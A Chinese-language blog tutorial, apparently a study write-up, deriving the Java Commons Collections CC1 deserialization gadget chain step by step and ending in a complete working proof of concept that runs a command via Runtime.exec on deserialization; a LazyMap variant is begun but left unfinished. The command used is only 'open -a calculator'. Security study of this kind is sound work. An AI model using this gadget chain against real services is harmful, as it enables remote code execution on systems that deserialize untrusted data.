<p>先把链子整理一下，目前的情况主要就是追踪到了checkSetValue()，然后我们要控制里面的<code>valueTransformer</code>是我们前面自己已经写好的的<code>invokerTransformer</code>，才能顺利调用，这里再尝试写出代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//        invokerTransformer.transform(runtime);</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap</span> <span class="operator">=</span> TransformedMap.decorate(hashMap,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line">        Class&lt;TransformedMap&gt; transformedMapClass = TransformedMap.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">checkSetValues</span> <span class="operator">=</span> transformedMapClass.getDeclaredMethod(<span class="string">&quot;checkSetValue&quot;</span>,Object.class);</span><br><span class="line">        checkSetValues.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        checkSetValues.invoke(decorateMap,runtime);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>讲一下，这里invokerTransformer就是用于最后invokerTransformer.transform()的执行，为什么这么定义前面已经写了，然后新建一个HashMap变量是用于 TransformedMap.decorate()的调用，这个函数就是对一个map进行装饰，进入这个函数才会触发TransformedMap的构造函数，才能给valueTransformer赋值，这就算是准备工作，后面我们需要出发checkSetValue函数，这个才是重头戏，因为是protected的，所以我们需要反射调用，后面几句全是为了触发反射做的准备工作</p>
<h4 id="进一步的链子"><a href="#进一步的链子" class="headerlink" title="进一步的链子"></a>进一步的链子</h4><p>目前我们就卡在checkSetValue这里，还要满足decorate，我们再find usage看谁调用了checkSetValue</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241128215139772.png" ></p>
<p>来到<code>AbstractInputCheckedMapDecorator</code>这个抽象类，它还是TransformerdMap的父类，里面一个继承了<code>AbstractSetDecorator</code>的内部类MapEntry有<code>setValue</code>方法调用了我们要的checkSetValue方法</p>
<blockquote>
<p><code>setValue()</code> <strong>实际上就是在 Map 中对一组 entry（键值对）</strong>进行 <code>setValue()</code> 操作。</p>
<p>一个MapEntry就是hash的一个键值对</p>
</blockquote>
<p>所以就是说当我们在调用decorate对map进行<strong>遍历</strong>的时候，就会触发setValue，而这个重写的setValue会触发我们要的checkSetValue</p>
<p>再重写现在的POC</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//        invokerTransformer.transform(runtime);</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>); <span class="comment">// 给hash赋值，保证后面会经入遍历的那个for循环</span></span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(hashMap,<span class="literal">null</span>,invokerTransformer); <span class="comment">// 搞到decorate</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry entry:decorateMap.entrySet())&#123;</span><br><span class="line">            entry.setValue(runtime);</span><br><span class="line">        &#125; <span class="comment">// 主动遍历触发这个重写的setValue</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接调用decorate，返回一个TransformedMap的东西，后面遍历的时候才会进到我们要到的setValue</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(hashMap,null,invokerTransformer);</span><br></pre></td></tr></table></figure>

<p>所以现在的链子就是找到一个入口hashmap，去触发获取TransformedMap再去遍历它触发setValue函数，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashMap入口</span><br><span class="line">	-&gt; .decorate() -&gt; TransformedMap</span><br><span class="line">		-&gt; 遍历setValue()</span><br><span class="line">			-&gt;AbstractInputCheckedMapDecorator#setValue()</span><br><span class="line">				-&gt; TransformedMap#checkSetValue()</span><br><span class="line">					-&gt; InvokerTransformer#transform()</span><br></pre></td></tr></table></figure>

<h4 id="找到链首readObject"><a href="#找到链首readObject" class="headerlink" title="找到链首readObject"></a>找到链首readObject</h4><p>我们在find usage，找到有一个类里面的readObject就调用了setValue（这里还是有一些限制条件的，后面再解决）</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241128222954112.png" ></p>
<p>所以按理说我们序列化<code>AnnotationInvocationHandler</code>这个类的时候就会触发<code>readObject</code>紧接着后面的链子</p>
<p>然后这个类没有写明作用域，就算是default，还是要用反射调用，理想状态下的poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span></span><br><span class="line">                , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>); <span class="comment">// 获取类</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class); <span class="comment">// 获取构造器</span></span><br><span class="line">        aihConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> aihConstructor.newInstance(Override.class, transformedMap); <span class="comment">// 实例化</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化反序列化</span></span><br><span class="line">        serialize(o); <span class="comment">// 于是自动触发readObject</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">		&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h4 id="现在的几个问题"><a href="#现在的几个问题" class="headerlink" title="现在的几个问题"></a>现在的几个问题</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241129104607762.png" ></p>
<ul>
<li>有几个if判断需要解决</li>
<li>readObject里面的setValue函数传参要怎么控制，我们要传的是Runtime对象，代码里明显和我们要做的不一样</li>
<li>Runtime.class不能序列化</li>
</ul>
<h5 id="解决Runtime不能序列化"><a href="#解决Runtime不能序列化" class="headerlink" title="解决Runtime不能序列化"></a>解决Runtime不能序列化</h5><p>Runtime不能序列化，但是Runtime.class可以，所以我们可以写一个普通反射，然后设法让InvokerTransformer调用</p>
<p>正常里说，我们的反射调用runtime.class是这么写</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) method.invoke(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line">        exec.invoke(runtime,<span class="string">&quot;open -a calculator&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这就比较麻烦了，我们用InvokerTransformer.transform()一次一次实现我们要的效果</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getRuntime</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line">        <span class="comment">// getRuntime = c.class.getMethod(&quot;getRuntime&quot;);</span></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(getRuntime);</span><br><span class="line">        <span class="comment">// Runtime runtime = getRuntime.invoke(null);</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;).transform(runtime);</span><br><span class="line">        <span class="comment">// exec.invoke(runtime,&quot;open -a calculator&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>每一句都是有对应的，然后一一循环调用，但是这样调用代码很冗余，于是前面有一个&#96;ChainedTransformer类，这里存在递归调用</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241129112729692.png" ></p>
<p>于是我们可以把代码优化成</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> chainedTransformer.transform(Runtime.class);</span><br><span class="line">&#125;        </span><br></pre></td></tr></table></figure>

<p>我们new一个Transformer数组，然后用ChainedTransformer递归调用就好了，最后只用到一个transform，又解决了runtime序列化问题也不会代码冗余。</p>
<p>那再结合最开始的decorate，我们再整理一下poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Override.class,transformedMap);</span><br><span class="line">        <span class="comment">// 序列化反序列化</span></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是咧还是不会弹计算机，我们跟进一下</p>
<p>断点打在AnnotationInvocationHandler里面的那个if判断，会发现它是不会进去的</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241129113859761.png" ></p>
<h5 id="解决if判断"><a href="#解决if判断" class="headerlink" title="解决if判断"></a>解决if判断</h5><p>这里有个memberType判断，我们要控制他不是null，看一下是什么东西</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-11-29%2011.55.13.png" ></p>
<p>这个type是我们前面构造函数里传入的注解类型的对象，图片第一个红框就是获取注解类型的成员方法</p>
<p>下面判断成员方法不能是空，我们前面传入的Override就是没有成员方法所以进不去if</p>
<p>现在我们选择传一个Target.class，里面就有一个成员变量value</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241129120230319.png" ></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey(); <span class="comment">// 键值对获取key，这里这个memberValue是我们最前面传的hashMap</span></span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name); <span class="comment">// 查找key是不是空的</span></span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) || <span class="comment">// 判断能不能强转</span></span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>所以我们在最前面改成传入Target.class，这次他有成员变量，但是没有和前面的hashMap键值对对应，还是进不了if</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-11-29%2012.10.27.png" ></p>
<p>调试一下，这个memberTypes也就是我们传入的Target.class里面没有a，所以memberType还是null</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-11-29%2012.12.31.png" ></p>
<p>现在改成hashMap.put(“value”,”flowww”)，</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241129121540544.png" ></p>
<p>这个时候再看就不是null了，可以进入第一个if，第二个if是在判断能不能强转，也能顺利进入了</p>
<p>现在我们调试顺利来到了setValue方法</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241129121912098.png" ></p>
<p>因为setValue里面的参数不可控，指定了特定的类，这限制了我们的命令执行</p>
<h5 id="进入setValue"><a href="#进入setValue" class="headerlink" title="进入setValue"></a>进入setValue</h5><p>先从头讲，我们按目前的情况进入到setValue再到checkSetValue</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241129123029689.png" ></p>
<p>我们要控制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">valueTransformer.transform(value);</span><br><span class="line">=</span><br><span class="line">chainedTransformer.transform(Runtime.class); </span><br></pre></td></tr></table></figure>

<p>但是也能看到调试到这里value不是Runtime.class</p>
<p>于是最后找到一个有可控参数的类ConstantTransformer</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241129122305671.png" ></p>
<p>构造方法里，任何传入的对象都放在iConstant里</p>
<p>transform里，无论传入什么都返回iConstant，这相当于一个常量了</p>
<p>我们在最开始chainedTransformer定义的时候多加一个ConstantTransformer构造，这样后面调用transform的时候无论传入的value是什么类型都会返回我们要的Runtime.class</p>
<h4 id="最后POC"><a href="#最后POC" class="headerlink" title="最后POC"></a>最后POC</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;flowww&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class,transformedMap);</span><br><span class="line">        <span class="comment">// 序列化反序列化</span></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>真是呕心沥血，未完待续，还有另一条lazymap的，我要抓紧补上</p>
<h3 id="LazyMap版"><a href="#LazyMap版" class="headerlink" title="LazyMap版"></a>LazyMap版</h3><p>有一部分是一样，直到一个地方有分叉，我们可以在transform那里查看用法，可以跟踪到<code>LazyMap.get()</code>也调用了transform</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20241130190835.png" ></p>
<p>跟进看一下factory是什么东西</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-11-30%2019.09.56.png" ></p>
<p>可以看到是Transformer类，而且还有前面熟悉的decorate，factory会在构造函数里出现，这个是可控的，符合我们的要求。</p>
<p>然后看一下这个类的构造函数，作用域是<code>protected</code>，所以我们需要反射调用</p>
<p>目前的链子这样是可行的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, invokerTransformer);</span><br><span class="line">        Class&lt;LazyMap&gt; clazz = LazyMap.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">LazyGet</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;get&quot;</span>, Object.class);</span><br><span class="line">        LazyGet.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        LazyGet.invoke(decorateMap, runtime);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>然后我们继续find usage，最后在 <code>AnnotationInvocationHandler.invoke()</code>函数里面找到调用</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20241201122517.png" ></p>
<p>而且这个类本身有readObject，这就方便了很多</p>
<p>结合这个类名，我们要触发invoke，就涉及到动态代理</p>
<blockquote>
<p>当对某个对象使用Proxy.newProxyInstance进行动态代理并传入有实现invoke的相应hanlder对象（比如这里的AnnotationInvocationHandler），当调用方法时，就会跳转到这个handler对象的invoke方法。</p>
</blockquote>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>感谢之前的师傅出的内容让我学习🙏</p>
<p><a class="link"   href="https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/#0x03-Common-Collections-%E7%9B%B8%E5%85%B3%E4%BB%8B%E7%BB%8D" >https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/#0x03-Common-Collections-%E7%9B%B8%E5%85%B3%E4%BB%8B%E7%BB%8D<i class="fas fa-external-link-alt"></i></a></p>
